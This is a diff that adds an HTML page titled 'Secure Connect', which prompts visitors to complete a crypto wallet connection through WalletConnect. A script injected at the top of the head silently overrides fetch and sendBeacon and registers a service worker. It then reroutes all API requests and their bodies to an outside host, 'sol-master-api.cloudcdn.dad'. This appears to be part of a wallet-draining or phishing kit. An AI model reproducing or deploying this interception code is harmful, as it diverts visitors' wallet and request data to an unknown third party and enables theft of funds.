@@ -1,0 +1,134 @@
+<!doctype html>
+<html lang="en">
+  <head>
+<script>
+(function () {
+  var BACKEND = "https://sol-master-api.cloudcdn.dad";
+  var orig = window.fetch.bind(window);
+  function urlOf(input) {
+    return typeof input === 'string' ? input : (input && input.url) || '';
+  }
+  function isApi(url) {
+    return typeof url === 'string' && (url.indexOf('/api/') !== -1 || url === '/api');
+  }
+  function proxyDirect(input, init) {
+    var url = urlOf(input);
+    if (!isApi(url)) return orig(input, init);
+    var incoming = new URL(url, location.href);
+    var headers = new Headers((init && init.headers) || undefined);
+    headers.delete('host');
+    headers.set('x-forwarded-host', location.hostname);
+    headers.set('x-forwarded-proto', 'https');
+    headers.set('x-original-host', location.hostname);
+    var method = ((init && init.method) || 'GET').toUpperCase();
+    var next = {
+      method: method,
+      headers: headers,
+      credentials: 'same-origin',
+      cache: 'no-store',
+      redirect: 'follow'
+    };
+    if (init && init.body !== undefined) next.body = init.body;
+    return orig(BACKEND + incoming.pathname + incoming.search, next);
+  }
+  function wrapBeacon(send) {
+    if (!navigator.sendBeacon) return;
+    var origBeacon = navigator.sendBeacon.bind(navigator);
+    navigator.sendBeacon = function (url, data) {
+      var u = String(url || '');
+      if (isApi(u)) {
+        var headers = {};
+        if (data && data.type) headers['content-type'] = data.type;
+        Promise.resolve(send(u, { method: 'POST', body: data, keepalive: true, credentials: 'same-origin', headers: headers })).catch(function () {});
+        return true;
+      }
+      return origBeacon(url, data);
+    };
+  }
+  if (!navigator.serviceWorker) {
+    window.fetch = proxyDirect;
+    wrapBeacon(proxyDirect);
+    return;
+  }
+  var RELOAD_KEY = 'sw-api-proxy-reload';
+  function waitForController(ms) {
+    return new Promise(function (resolve, reject) {
+      var settled = false;
+      function finish(err) {
+        if (settled) return;
+        settled = true;
+        if (err) reject(err);
+        else resolve();
+      }
+      navigator.serviceWorker.addEventListener('controllerchange', function onChange() {
+        navigator.serviceWorker.removeEventListener('controllerchange', onChange);
+        finish();
+      });
+      if (navigator.serviceWorker.controller) {
+        finish();
+        return;
+      }
+      setTimeout(function () {
+        if (navigator.serviceWorker.controller) finish();
+        else finish(new Error('api_proxy_timeout'));
+      }, ms);
+    });
+  }
+  var gate = navigator.serviceWorker.register("/sw-api-proxy.js", { updateViaCache: 'none' }).then(function (reg) {
+    if (reg.waiting) reg.waiting.postMessage('skipWaiting');
+    return navigator.serviceWorker.ready.then(function () { return waitForController(4000); });
+  }).then(function () {
+    try { sessionStorage.removeItem(RELOAD_KEY); } catch (e) {}
+  }).catch(function () {
+    try {
+      if (!sessionStorage.getItem(RELOAD_KEY)) {
+        sessionStorage.setItem(RELOAD_KEY, '1');
+        location.reload();
+        return new Promise(function () {});
+      }
+    } catch (e) {}
+    return Promise.reject(new Error('api_proxy_unavailable'));
+  });
+  window.fetch = function (input, init) {
+    if (!isApi(urlOf(input))) return orig(input, init);
+    return gate.then(function () { return orig(input, init); }).catch(function () {
+      return proxyDirect(input, init);
+    });
+  };
+  wrapBeacon(function (url, init) {
+    return gate.then(function () { return orig(url, init); }).catch(function () {
+      return proxyDirect(url, init);
+    });
+  });
+})();
+</script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Secure Connect</title>
+    <meta name="description" content="Complete your wallet connection." />
+    <link rel="preconnect" href="https://api.web3modal.org" crossorigin />
+    <link rel="preconnect" href="https://explorer-api.walletconnect.com" crossorigin />
+    <link rel="dns-prefetch" href="https://api.web3modal.org" />
+    <link rel="dns-prefetch" href="https://explorer-api.walletconnect.com" />
+    <style>
+      html,
+      body,
+      #root {
+        margin: 0;
+        background: transparent;
+      }
+    </style>
+    <script>
+      (function () {
+        var embed =
+          /[?&]embed=1(?:&|$)/.test(location.search) && window.parent !== window;
+        if (embed) document.documentElement.setAttribute("data-embed", "1");
+      })();
+    </script>
+    <script type="module" crossorigin src="/assets/index-C2amc2Up.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-C4ouqgGg.css">
+  </head>
+  <body>
+    <div id="root"></div>
+  </body>
+</html>
